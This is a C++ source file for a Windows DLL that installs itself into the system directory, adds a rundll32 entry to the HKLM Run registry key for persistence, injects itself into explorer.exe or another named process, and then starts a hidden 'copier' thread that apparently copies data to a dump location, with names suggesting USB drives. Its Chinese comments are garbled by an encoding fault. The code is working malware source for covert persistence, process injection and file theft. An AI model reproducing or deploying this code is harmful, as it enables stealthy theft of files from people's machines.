/*
 * Copyright (c) 2005, Outmatch@gmail.com
 * All rights reserved.
 *
 * �ļ����ƣ�inject.cpp
 * ժ    Ҫ��DLL������,ִ�а�װ��������
 */

#include "stdafx.h"
#include "remotelib.h"
#include "Kernel32Funcs.h"
#include "misc.h"

using namespace std;

#pragma comment(lib, "advapi32.lib")

// Macro to make our code less messy.
#define KERNEL32_PROC(x)	g_kernel32.##x## = (fn##x##)::GetProcAddress(::GetModuleHandleA("Kernel32"), #x ##)

// RemoteLib��ʹ��
extern HINSTANCE g_hModInstance;

extern "C" __declspec(dllexport) void CALLBACK Install (
		HWND hwnd,
		HINSTANCE hInstance,
		LPTSTR lpCmdLine,
		int nCmdShow
		);

extern "C" __declspec(dllexport) void CALLBACK Start (
		HWND hwnd,
		HINSTANCE hInstance,
		LPTSTR lpCmdLine,
		int nCmdShow
		);

extern std::string getDLLPath();

extern void saveConfig(const std::string& dstPath);

/// dll���ļ���
char g_szDllname[MAX_PATH+1] = { 0 };
/// ȱʡ����·��
const char* g_szDefaultPath = "C:\\windows\\system32\\usbstro.dll.dump";
/// ȱʡ��������
const char* g_szDefaultKey  = "USBStro";

/// д�뵽ע���������
void installToSystem()
{
	std::string dstPath;
	HKEY phkResult;

	// д��"rundll32 dllname,Start target.exe"��������
	const char* KeyName = g_szDefaultKey;
	char KeyValue[MAX_PATH+1];
	strcpy(KeyValue, "rundll32 ");
	strcat(KeyValue, g_szDllname);
	strcat(KeyValue, ",Start ");
	// ���ָ�����Զ���Ŀ��������ͼ��뵽KeyValue
	if(__argc >= 3)
		strcat(KeyValue, __argv[2]);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE,
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",
			0,
			NULL,
			REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,
			NULL,
			&phkResult,
			NULL);

	RegSetValueEx(phkResult,
			KeyName,
			0,
			REG_SZ,
			(const BYTE*) KeyValue,
			lstrlen(KeyValue) + 1);
	RegCloseKey(phkResult);
}

/// ��װDLL��ϵͳ�ڲ���ʹ��rundll32����
extern "C" __declspec(dllexport) void CALLBACK Install (
		HWND hwnd,
		HINSTANCE hInstance,
		LPTSTR lpCmdLine,
		int nCmdShow
		)
{
	if(__argc < 2) {
#ifdef _DEBUG
		char str[MAX_PATH+1] = { "\0" };
		_snprintf(str, MAX_PATH, "�÷�: rundll32.exe %s,Install <���������> [�洢λ��]", g_szDllname);
		MessageBox(0, str, g_szDllname, 0);
#endif
		return;
	}

	// dllPath: ��װǰDLL·��, destDllPath: ��װ��DLL·��
	CHAR dllPath[MAX_PATH+1];

	HMODULE g_DLLHandle = GetModuleHandle(g_szDllname);
	// �õ���ǰDLLλ��
	GetModuleFileName(g_DLLHandle, dllPath, MAX_PATH);
	// �õ���װ��ϵͳ·��
	std::string destPath = getDLLPath();
	// ����DLL��ϵͳ�ļ�
	CopyFile(dllPath, destPath.c_str(), FALSE);

	std::string dstPath;
	if(__argc < 4) 
		dstPath = g_szDefaultPath;
	else
		dstPath = __argv[3];
	installToSystem();

	saveConfig(dstPath);

	Start(hwnd, hInstance, lpCmdLine, nCmdShow);
}

/// ��������ʹ��"rundll32 xxx.dll,Start [target.exe]"����
extern "C" __declspec(dllexport) void CALLBACK Start (
		HWND hwnd,
		HINSTANCE hInstance,
		LPTSTR lpCmdLine,
		int nCmdShow
		)
{
	const char* pszTarget;
	if(__argc < 3) {
		pszTarget = "explorer.exe"; // ȱʡĿ��Ϊexplorer.exe
	}
	else {
		pszTarget = __argv[2];      // ��ָ��Ŀ�������
	}

	std::string destPath = getDLLPath();
	
	enablePrivilege();	
	// ѡ��ע����߳�
	PIDGroup pid = GetDestProcessID(pszTarget);
	if(pid.empty())
	{
#ifdef _DEBUG
		CHAR msg[BUFSIZ + 1];
		_snprintf(msg, BUFSIZ, "%s : Ŀ�����δ�ҵ�", pszTarget);
		MessageBox(0, msg, g_szDllname, 0);
#endif
		return;
	}
	for(size_t i=0; i<pid.size(); i++) {
		HMODULE nRet = RemoteLoadLibraryNT(pid[i], destPath.c_str());
		if(0 == nRet) {
			reportError("RemoteLoadLibraryNT");	
		}
		else /* Successful */ {
#if 0
			CHAR msg[BUFSIZ + 1];
			_snprintf(msg, BUFSIZ, "RemoteLoadLibraryNT Sucessful on pid: %d", *it);
			MessageBox(0, msg, g_szDllname, 0);
#endif
		}
	}
}

/// ��������
void saveConfig(const std::string &dstPath)
{
	// ��¼Ŀ��Ŀ¼���������ļ�
	std::string str = getConfigPath();
	ofstream of(str.c_str());
	of << dstPath << endl;
	of.close();
}

/// �õ�DLL·����
std::string getDLLPath()
{
	std::string destPath;
	destPath = getSystemPath();
	destPath += "\\";
	destPath += g_szDllname;
	return destPath;
}

/// �õ�DLL�ļ���
std::string getModuleFilename()
{
	char szPath[MAX_PATH+1] = { 0 }, szName[MAX_PATH+1], szExt[MAX_PATH+1];

	GetModuleFileName(g_hModInstance, szPath, MAX_PATH);

	_splitpath(
			szPath,
			0,
			0,
			szName,
			szExt
			);

	std::string result = szName;
	result += szExt;

	return result;
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
{
	g_hModInstance = hinstDLL; // this will be passed into ::SetWindowsHookEx
	std::string str = getModuleFilename();
	strcpy(g_szDllname, str.c_str());
	::DisableThreadLibraryCalls(hinstDLL);
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		// Try to load possibly missing functions from Kernel32.dll.
		KERNEL32_PROC(LoadLibraryW);
		KERNEL32_PROC(GetModuleHandleW);
		KERNEL32_PROC(GetModuleFileNameW);
		KERNEL32_PROC(CreateToolhelp32Snapshot);
		KERNEL32_PROC(Module32First);
		KERNEL32_PROC(Module32FirstW);
		KERNEL32_PROC(Module32Next);
		KERNEL32_PROC(Module32NextW);
	}

	if ( fdwReason == DLL_PROCESS_ATTACH )
	{
		CHAR dllName[MAX_PATH+1];
		strcpy(dllName, __argv[0]);	
		if(strstr(dllName, "rundll32") == NULL) 
		{
			// MessageBox( NULL, _T("DLL�Ѱ�װ��Ŀ����̡�"), dllName, MB_ICONINFORMATION );
			// ���������߳�
			_beginthread((void (__cdecl *)(void *))copierThreadFunc, 0, 0);
		}
	}

	return TRUE;
}
